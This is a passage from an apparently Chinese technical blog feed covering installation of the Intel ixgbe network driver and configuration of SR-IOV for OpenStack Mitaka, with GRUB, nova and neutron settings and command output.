class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138691]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">113</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138698]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">114</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138706]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">115</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138714]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">116</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138722]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">117</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138730]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">118</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138737]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">119</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138751]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">120</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138758]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">121</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br></pre></td></tr></table></figure><h2 id="4-安装-ixgbe-驱动"><a href="#4-安装-ixgbe-驱动" class="headerlink" title="4. 安装 ixgbe 驱动"></a>4. 安装 ixgbe 驱动</h2><p>确认驱动加载成功后，继续安装驱动到系统</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># make install</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">make</span>[<span class="number">1</span>]: Entering directory `/usr/src/kernels/<span class="number">3</span>.<span class="number">10</span>.<span class="number">0</span>-<span class="number">862</span>.<span class="number">6</span>.<span class="number">3</span>.el<span class="number">7</span>.x<span class="number">86</span>_<span class="number">64</span>&#x27;</span><br><span class="line">  <span class="attribute">Building</span> modules, stage <span class="number">2</span>.</span><br><span class="line">  <span class="attribute">MODPOST</span> <span class="number">1</span> modules</span><br><span class="line"><span class="attribute">make</span>[<span class="number">1</span>]: Leaving directory `/usr/src/kernels/<span class="number">3</span>.<span class="number">10</span>.<span class="number">0</span>-<span class="number">862</span>.<span class="number">6</span>.<span class="number">3</span>.el<span class="number">7</span>.x<span class="number">86</span>_<span class="number">64</span>&#x27;</span><br><span class="line"><span class="attribute">Copying</span> manpages...</span><br><span class="line"><span class="attribute">Installing</span> modules...</span><br><span class="line"><span class="attribute">make</span>[<span class="number">1</span>]: Entering directory `/usr/src/kernels/<span class="number">3</span>.<span class="number">10</span>.<span class="number">0</span>-<span class="number">862</span>.<span class="number">6</span>.<span class="number">3</span>.el<span class="number">7</span>.x<span class="number">86</span>_<span class="number">64</span>&#x27;</span><br><span class="line">  <span class="attribute">INSTALL</span> /root/ixgbe-<span class="number">5</span>.<span class="number">3</span>.<span class="number">7</span>/src/ixgbe.ko</span><br><span class="line"><span class="attribute">Can</span>&#x27;t read private key</span><br><span class="line">  <span class="attribute">DEPMOD</span>  <span class="number">3</span>.<span class="number">10</span>.<span class="number">0</span>-<span class="number">862</span>.<span class="number">6</span>.<span class="number">3</span>.el<span class="number">7</span>.x<span class="number">86</span>_<span class="number">64</span></span><br><span class="line"><span class="attribute">make</span>[<span class="number">1</span>]: Leaving directory `/usr/src/kernels/<span class="number">3</span>.<span class="number">10</span>.<span class="number">0</span>-<span class="number">862</span>.<span class="number">6</span>.<span class="number">3</span>.el<span class="number">7</span>.x<span class="number">86</span>_<span class="number">64</span>&#x27;</span><br><span class="line"><span class="attribute">Running</span> depmod...</span><br></pre></td></tr></table></figure><p>ixgbe.ko 会被安装到以下目录</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/lib/m</span>odules<span class="regexp">/KERNEL_VERSION/u</span>pdates<span class="regexp">/drivers/</span>net<span class="regexp">/ethernet/i</span>ntel<span class="regexp">/ixgbe/</span></span><br></pre></td></tr></table></figure><p>编译好的驱动将在启动的时候自动加载，也可以用以下命令加载</p><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta"># modprobe ixgbe</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># modinfo ixgbe</span></span><br><span class="line"><span class="symbol">filename:</span>       <span class="meta-keyword">/lib/</span>modules/<span class="number">3.10</span><span class="number">.0</span><span class="number">-862.6</span><span class="number">.3</span>.el7.x86_64<span class="meta-keyword">/updates/</span>drivers<span class="meta-keyword">/net/</span>ethernet<span class="meta-keyword">/intel/</span>ixgbe/ixgbe.ko</span><br><span class="line"><span class="symbol">version:</span>        <span class="number">5.3</span><span class="number">.7</span></span><br><span class="line"><span class="symbol">license:</span>        GPL</span><br><span class="line"><span class="symbol">description:</span>    Intel(R) <span class="number">10</span>GbE PCI Express Linux Network Driver</span><br><span class="line"><span class="symbol">author:</span>         Intel Corporation, <span class="params">&lt;linux.nics@intel.com&gt;</span></span><br><span class="line"><span class="symbol">retpoline:</span>      Y</span><br><span class="line"><span class="symbol">rhelversion:</span>    <span class="number">7.5</span></span><br><span class="line"><span class="symbol">srcversion:</span>     <span class="number">9E1</span>B3824190E963083DADF5</span><br><span class="line">……</span><br></pre></td></tr></table></figure><hr><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://ask.xmodulo.com/compile-ixgbe-driver-centos-rhel-fedora.html">How to compile ixgbe driver on CentOS, RHEL or Fedora</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sriov </tag>
            
            <tag> ixgbe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenStack SR-IOV研究</title>
      <link href="openstack/openstack-sriov.html"/>
      <url>openstack/openstack-sriov.html</url>
      
        <content type="html"><![CDATA[<p>关于 SR-IOV 本文就不再介绍了,具体可以查看 <a href="https://www.intel.com/content/www/us/en/embedded/products/networking/82599-sr-iov-driver-companion-guide.html">Intel® 82599 SR-IOV Driver Companion Guide</a>。</p><h2 id="一、系统环境"><a href="#一、系统环境" class="headerlink" title="一、系统环境"></a>一、系统环境</h2><p>操作系统: RHEL 7.2<br>OpenStack版本: OpenStack Mitaka Allinone<br>网卡型号: Intel Corporation 82599ES<br>SR-IVO网卡名: ens1f0, ens1f0</p><h2 id="二、服务器配置"><a href="#二、服务器配置" class="headerlink" title="二、服务器配置"></a>二、服务器配置</h2><p>在服务器 BIOS 中开启 VT-d 和 SR-IOV</p><h2 id="三、操作系统配置"><a href="#三、操作系统配置" class="headerlink" title="三、操作系统配置"></a>三、操作系统配置</h2><h3 id="1-编辑-etc-default-grub-文件-加入以下内容"><a href="#1-编辑-etc-default-grub-文件-加入以下内容" class="headerlink" title="1. 编辑 /etc/default/grub 文件,加入以下内容"></a>1. 编辑 /etc/default/grub 文件,加入以下内容</h3><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"># vim /etc/default/grub</span><br><span class="line"></span><br><span class="line">GRUB_TIMEOUT=5</span><br><span class="line">GRUB_DISTRIBUTOR=&quot;$(sed &#x27;s, release .*$,,g&#x27; /etc/system-release)&quot;</span><br><span class="line">GRUB_DEFAULT=saved</span><br><span class="line">GRUB_DISABLE_SUBMENU=true</span><br><span class="line">GRUB_TERMINAL_OUTPUT=&quot;console&quot;</span><br><span class="line"><span class="deletion">-GRUB_CMDLINE_LINUX=&quot;rd.lvm.lv=rhel/root rd.lvm.lv=rhel/swap rhgb quiet&quot;</span></span><br><span class="line"><span class="addition">+GRUB_CMDLINE_LINUX=&quot;rd.lvm.lv=rhel/root rd.lvm.lv=rhel/swap rhgb quiet intel_iommu=on&quot;</span></span><br><span class="line">GRUB_DISABLE_RECOVERY=&quot;true&quot;</span><br></pre></td></tr></table></figure><p>需要说明的是: ixgbe.max_vfs 参数已经废弃，故没有加入到内核参数中。</p><span id="more"></span><h3 id="2-重新生成-grub-文件"><a href="#2-重新生成-grub-文件" class="headerlink" title="2. 重新生成 grub 文件"></a>2. 重新生成 grub 文件</h3><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># grub2-mkconfig -o <span class="regexp">/boot/g</span>rub2/grub.cfg</span><br></pre></td></tr></table></figure><h3 id="3-配置-SR-IOV-的网卡开机自启"><a href="#3-配置-SR-IOV-的网卡开机自启" class="headerlink" title="3. 配置 SR-IOV 的网卡开机自启"></a>3. 配置 SR-IOV 的网卡开机自启</h3><p>编辑网卡配置文件，修改以下内容</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">BOOTPROTO</span>=none</span><br><span class="line"><span class="attr">ONBOOT</span>=<span class="literal">yes</span></span><br></pre></td></tr></table></figure><h3 id="4-设置开机自动创建-VF-计算节点"><a href="#4-设置开机自动创建-VF-计算节点" class="headerlink" title="4. 设置开机自动创建 VF(计算节点)"></a>4. 设置开机自动创建 VF(计算节点)</h3><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># vim <span class="regexp">/etc/</span>rc.d/rc.local</span><br><span class="line"></span><br><span class="line">echo <span class="string">&#x27;0&#x27;</span> &gt; <span class="regexp">/sys/</span><span class="keyword">class</span><span class="regexp">/net/</span>ens1f0<span class="regexp">/device/</span>sriov_numvfs</span><br><span class="line">echo <span class="string">&#x27;7&#x27;</span> &gt; <span class="regexp">/sys/</span><span class="keyword">class</span><span class="regexp">/net/</span>ens1f0<span class="regexp">/device/</span>sriov_numvfs</span><br><span class="line">echo <span class="string">&#x27;0&#x27;</span> &gt; <span class="regexp">/sys/</span><span class="keyword">class</span><span class="regexp">/net/</span>ens1f1<span class="regexp">/device/</span>sriov_numvfs</span><br><span class="line">echo <span class="string">&#x27;7&#x27;</span> &gt; <span class="regexp">/sys/</span><span class="keyword">class</span><span class="regexp">/net/</span>ens1f1<span class="regexp">/device/</span>sriov_numvfs</span><br><span class="line"></span><br><span class="line">chmod +x <span class="regexp">/etc/</span>rc.d/rc.local</span><br></pre></td></tr></table></figure><h3 id="5-重启服务器"><a href="#5-重启服务器" class="headerlink" title="5. 重启服务器"></a>5. 重启服务器</h3><h3 id="6-验证-VF-已经创建，并且是-up-状态"><a href="#6-验证-VF-已经创建，并且是-up-状态" class="headerlink" title="6. 验证 VF 已经创建，并且是 up 状态"></a>6. 验证 VF 已经创建，并且是 up 状态</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># lspci | grep Ethernet</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">05</span>:<span class="number">00</span>.<span class="number">0</span> Ethernet controller: Intel Corporation <span class="number">82599</span>ES <span class="number">10</span>-Gigabit SFI/SFP+ Network Connection (rev <span class="number">01</span>)</span><br><span class="line"><span class="attribute">05</span>:<span class="number">00</span>.<span class="number">1</span> Ethernet controller: Intel Corporation <span class="number">82599</span>ES <span class="number">10</span>-Gigabit SFI/SFP+ Network Connection (rev <span class="number">01</span>)</span><br><span class="line"><span class="attribute">05</span>:<span class="number">10</span>.<span class="number">0</span> Ethernet controller: Intel Corporation <span class="number">82599</span> Ethernet Controller Virtual Function (rev <span class="number">01</span>)</span><br><span class="line"><span class="attribute">05</span>:<span class="number">10</span>.<span class="number">1</span> Ethernet controller: Intel Corporation <span class="number">82599</span> Ethernet Controller Virtual Function (rev <span class="number">01</span>)</span><br><span class="line"><span class="attribute">05</span>:<span class="number">10</span>.<span class="number">2</span> Ethernet controller: Intel Corporation <span class="number">82599</span> Ethernet Controller Virtual Function (rev <span class="number">01</span>)</span><br><span class="line"><span class="attribute">05</span>:<span class="number">10</span>.<span class="number">3</span> Ethernet controller: Intel Corporation <span class="number">82599</span> Ethernet Controller Virtual Function (rev <span class="number">01</span>)</span><br><span class="line"><span class="attribute">05</span>:<span class="number">10</span>.<span class="number">4</span> Ethernet controller: Intel Corporation <span class="number">82599</span> Ethernet Controller Virtual Function (rev <span class="number">01</span>)</span><br><span class="line"><span class="attribute">05</span>:<span class="number">10</span>.<span class="number">5</span> Ethernet controller: Intel Corporation <span class="number">82599</span> Ethernet Controller Virtual Function (rev <span class="number">01</span>)</span><br><span class="line"><span class="attribute">05</span>:<span class="number">10</span>.<span class="number">6</span> Ethernet controller: Intel Corporation <span class="number">82599</span> Ethernet Controller Virtual Function (rev <span class="number">01</span>)</span><br><span class="line"><span class="attribute">05</span>:<span class="number">10</span>.<span class="number">7</span> Ethernet controller: Intel Corporation <span class="number">82599</span> Ethernet Controller Virtual Function (rev <span class="number">01</span>)</span><br><span class="line"><span class="attribute">05</span>:<span class="number">11</span>.<span class="number">0</span> Ethernet controller: Intel Corporation <span class="number">82599</span> Ethernet Controller Virtual Function (rev <span class="number">01</span>)</span><br><span class="line"><span class="attribute">05</span>:<span class="number">11</span>.<span class="number">1</span> Ethernet controller: Intel Corporation <span class="number">82599</span> Ethernet Controller Virtual Function (rev <span class="number">01</span>)</span><br><span class="line"><span class="attribute">05</span>:<span class="number">11</span>.<span class="number">2</span> Ethernet controller: Intel Corporation <span class="number">82599</span> Ethernet Controller Virtual Function (rev <span class="number">01</span>)</span><br><span class="line"><span class="attribute">05</span>:<span class="number">11</span>.<span class="number">3</span> Ethernet controller: Intel Corporation <span class="number">82599</span> Ethernet Controller Virtual Function (rev <span class="number">01</span>)</span><br><span class="line"><span class="attribute">05</span>:<span class="number">11</span>.<span class="number">4</span> Ethernet controller: Intel Corporation <span class="number">82599</span> Ethernet Controller Virtual Function (rev <span class="number">01</span>)</span><br><span class="line"><span class="attribute">05</span>:<span class="number">11</span>.<span class="number">5</span> Ethernet controller: Intel Corporation <span class="number">82599</span> Ethernet Controller Virtual Function (rev <span class="number">01</span>)</span><br><span class="line"><span class="attribute">05</span>:<span class="number">11</span>.<span class="number">6</span> Ethernet controller: Intel Corporation <span class="number">82599</span> Ethernet Controller Virtual Function (rev <span class="number">01</span>)</span><br><span class="line"><span class="attribute">05</span>:<span class="number">11</span>.<span class="number">7</span> Ethernet controller: Intel Corporation <span class="number">82599</span> Ethernet Controller Virtual Function (rev <span class="number">01</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ip link show ens1f0</span></span><br><span class="line"><span class="attribute">6</span>: ens<span class="number">1</span>f<span class="number">0</span>: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="number">1500</span> qdisc mq state UP mode DEFAULT qlen <span class="number">1000</span></span><br><span class="line">    <span class="attribute">link</span>/ether <span class="number">14</span>:<span class="number">02</span>:ec:<span class="number">82</span>:<span class="number">96</span>:c<span class="number">0</span> brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">0</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">1</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">2</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">3</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">4</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">5</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">6</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">7</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line"></span><br><span class="line"><span class="comment"># ip link show ens1f1</span></span><br><span class="line"><span class="attribute">7</span>: ens<span class="number">1</span>f<span class="number">1</span>: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="number">1500</span> qdisc mq state UP mode DEFAULT qlen <span class="number">1000</span></span><br><span class="line">    <span class="attribute">link</span>/ether <span class="number">14</span>:<span class="number">02</span>:ec:<span class="number">82</span>:<span class="number">96</span>:c<span class="number">1</span> brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">0</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">1</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">2</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">3</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">4</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">5</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">6</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">7</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br></pre></td></tr></table></figure><h2 id="四、OpenStack-配置"><a href="#四、OpenStack-配置" class="headerlink" title="四、OpenStack 配置"></a>四、OpenStack 配置</h2><h3 id="安装-sr-iov-agent-计算节点"><a href="#安装-sr-iov-agent-计算节点" class="headerlink" title="安装 sr-iov agent(计算节点)"></a>安装 sr-iov agent(计算节点)</h3><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># yum -y install openstack-neutron-sriov-nic-agent.noarch</span></span><br></pre></td></tr></table></figure><h3 id="控制节点配置"><a href="#控制节点配置" class="headerlink" title="控制节点配置"></a>控制节点配置</h3><h4 id="1-修改-nova-调度，启用-PciPassthrough-Filter"><a href="#1-修改-nova-调度，启用-PciPassthrough-Filter" class="headerlink" title="1. 修改 nova 调度，启用 PciPassthrough Filter"></a>1. 修改 nova 调度，启用 PciPassthrough Filter</h4><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/nova/nova.conf</span></span><br><span class="line"></span><br><span class="line"><span class="section">[DEFAULT]</span></span><br><span class="line"><span class="attr">scheduler_available_filters</span>=nova.scheduler.filters.all_filters</span><br><span class="line"><span class="attr">scheduler_default_filters</span>=RetryFilter,AvailabilityZoneFilter,RamFilter,DiskFilter,ComputeFilter,ComputeCapabilitiesFilter,ImagePropertiesFilter,ServerGroupAntiAffinityFilter,ServerGroupAffinityFilter,PciPassthroughFilter</span><br></pre></td></tr></table></figure><h4 id="2-在-ML2-中加载-sriovnicswitch-mechanism-driver-并设置网络绑定"><a href="#2-在-ML2-中加载-sriovnicswitch-mechanism-driver-并设置网络绑定" class="headerlink" title="2. 在 ML2 中加载 sriovnicswitch  mechanism driver,并设置网络绑定"></a>2. 在 ML2 中加载 sriovnicswitch  mechanism driver,并设置网络绑定</h4><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/neutron/plugins/ml2/ml2_conf.ini</span></span><br><span class="line"></span><br><span class="line"><span class="section">[ml2]</span></span><br><span class="line"><span class="attr">type_drivers</span> = flat,vlan</span><br><span class="line">tenant_network_types =</span><br><span class="line"><span class="attr">mechanism_drivers</span> = openvswitch,sriovnicswitch</span><br><span class="line"><span class="attr">extension_drivers</span> = port_security</span><br><span class="line"></span><br><span class="line"><span class="section">[ml2_type_vlan]</span></span><br><span class="line"><span class="attr">network_vlan_ranges</span> = provider,sriov1,sriov2</span><br><span class="line"></span><br><span class="line"><span class="section">[securitygroup]</span></span><br><span class="line"><span class="attr">firewall_driver</span> = neutron.agent.firewall.NoopFirewallDriver</span><br></pre></td></tr></table></figure><h4 id="3-增加支持的-PCI-厂家的-VF-设备"><a href="#3-增加支持的-PCI-厂家的-VF-设备" class="headerlink" title="3. 增加支持的 PCI 厂家的 VF 设备"></a>3. 增加支持的 PCI 厂家的 VF 设备</h4><ul><li>查看id<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"># <span class="selector-tag">lspci</span> <span class="selector-tag">-nn</span> | <span class="selector-tag">grep</span> <span class="selector-tag">-i</span> <span class="selector-tag">ethernet</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">02</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">controller</span> <span class="selector-attr">[0200]</span>: <span class="selector-tag">Broadcom</span> <span class="selector-tag">Corporation</span> <span class="selector-tag">NetXtreme</span> <span class="selector-tag">BCM5719</span> <span class="selector-tag">Gigabit</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">PCIe</span> <span class="selector-attr">[14e4:1657]</span> (rev <span class="number">01</span>)</span><br><span class="line"><span class="selector-tag">02</span>:<span class="selector-tag">00</span><span class="selector-class">.1</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">controller</span> <span class="selector-attr">[0200]</span>: <span class="selector-tag">Broadcom</span> <span class="selector-tag">Corporation</span> <span class="selector-tag">NetXtreme</span> <span class="selector-tag">BCM5719</span> <span class="selector-tag">Gigabit</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">PCIe</span> <span class="selector-attr">[14e4:1657]</span> (rev <span class="number">01</span>)</span><br><span class="line"><span class="selector-tag">02</span>:<span class="selector-tag">00</span><span class="selector-class">.2</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">controller</span> <span class="selector-attr">[0200]</span>: <span class="selector-tag">Broadcom</span> <span class="selector-tag">Corporation</span> <span class="selector-tag">NetXtreme</span> <span class="selector-tag">BCM5719</span> <span class="selector-tag">Gigabit</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">PCIe</span> <span class="selector-attr">[14e4:1657]</span> (rev <span class="number">01</span>)</span><br><span class="line"><span class="selector-tag">02</span>:<span class="selector-tag">00</span><span class="selector-class">.3</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">controller</span> <span class="selector-attr">[0200]</span>: <span class="selector-tag">Broadcom</span> <span class="selector-tag">Corporation</span> <span class="selector-tag">NetXtreme</span> <span class="selector-tag">BCM5719</span> <span class="selector-tag">Gigabit</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">PCIe</span> <span class="selector-attr">[14e4:1657]</span> (rev <span class="number">01</span>)</span><br><span class="line"><span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">controller</span> <span class="selector-attr">[0200]</span>: <span class="selector-tag">Intel</span> <span class="selector-tag">Corporation</span> <span class="selector-tag">82599ES</span> <span class="selector-tag">10-Gigabit</span> <span class="selector-tag">SFI</span>/<span class="selector-tag">SFP</span>+ <span class="selector-tag">Network</span> <span class="selector-tag">Connection</span> <span class="selector-attr">[8086:10fb]</span> (rev <span class="number">01</span>)</span><br><span class="line"><span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.1</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">controller</span> <span class="selector-attr">[0200]</span>: <span class="selector-tag">Intel</span> <span class="selector-tag">Corporation</span> <span class="selector-tag">82599ES</span> <span class="selector-tag">10-Gigabit</span> <span class="selector-tag">SFI</span>/<span class="selector-tag">SFP</span>+ <span class="selector-tag">Network</span> <span class="selector-tag">Connection</span> <span class="selector-attr">[8086:10fb]</span> (rev <span class="number">01</span>)</span><br><span class="line"><span class="selector-tag">05</span>:<span class="selector-tag">10</span><span class="selector-class">.0</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">controller</span> <span class="selector-attr">[0200]</span>: <span class="selector-tag">Intel</span> <span class="selector-tag">Corporation</span> <span class="selector-tag">82599</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">Controller</span> <span class="selector-tag">Virtual</span> <span class="selector-tag">Function</span> <span class="selector-attr">[8086:10ed]</span> (rev <span class="number">01</span>)</span><br><span class="line"><span class="selector-tag">05</span>:<span class="selector-tag">10</span><span class="selector-class">.1</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">controller</span> <span class="selector-attr">[0200]</span>: <span class="selector-tag">Intel</span> <span class="selector-tag">Corporation</span> <span class="selector-tag">82599</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">Controller</span> <span class="selector-tag">Virtual</span> <span class="selector-tag">Function</span> <span class="selector-attr">[8086:10ed]</span> (rev <span class="number">01</span>)</span><br><span class="line"><span class="selector-tag">05</span>:<span class="selector-tag">10</span><span class="selector-class">.2</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">controller</span> <span class="selector-attr">[0200]</span>: <span class="selector-tag">Intel</span> <span class="selector-tag">Corporation</span> <span class="selector-tag">82599</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">Controller</span> <span class="selector-tag">Virtual</span> <span class="selector-tag">Function</span> <span class="selector-attr">[8086:10ed]</span> (rev <span class="number">01</span>)</span><br><span class="line"><span class="selector-tag">05</span>:<span class="selector-tag">10</span><span class="selector-class">.3</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">controller</span> <span class="selector-attr">[0200]</span>: <span class="selector-tag">Intel</span> <span class="selector-tag">Corporation</span> <span class="selector-tag">82599</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">Controller</span> <span class="selector-tag">Virtual</span> <span class="selector-tag">Function</span> <span class="selector-attr">[8086:10ed]</span> (rev <span class="number">01</span>)</span><br><span class="line"><span class="selector-tag">05</span>:<span class="selector-tag">10</span><span class="selector-class">.4</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">controller</span> <span class="selector-attr">[0200]</span>: <span class="selector-tag">Intel</span> <span class="selector-tag">Corporation</span> <span class="selector-tag">82599</span> <span 